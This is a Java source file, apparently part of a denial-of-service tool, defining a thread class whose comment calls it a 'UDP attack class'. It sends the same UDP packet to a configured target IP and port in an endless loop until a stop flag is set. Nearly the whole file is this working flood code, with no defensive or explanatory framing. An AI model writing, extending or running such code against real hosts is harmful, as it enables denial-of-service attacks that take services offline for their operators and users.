package com.zhanyingwl.www;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

import static com.zhanyingwl.www.doDCRun.*;

/**
 * @ClassName : udpThread
 * @Description : UDP攻击类
 * @Author : 战鹰
 * @Version:
 */

public class udpThread extends Thread {
    @Override
    public void run() {
        try {
            DatagramSocket ds = new DatagramSocket();
            InetAddress IAip = InetAddress.getByName(targetIp);
            byte[] info = UDPData.getBytes();
            DatagramPacket p = new DatagramPacket(info, UDPData.length(), IAip, Integer.parseInt(targetPort));
            while (true) {
                if (!stop) {
                    ds.send(p);
                } else if (stop) {
                    break;
                }
            }
            threadLock = 0; // 解除单线程锁
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
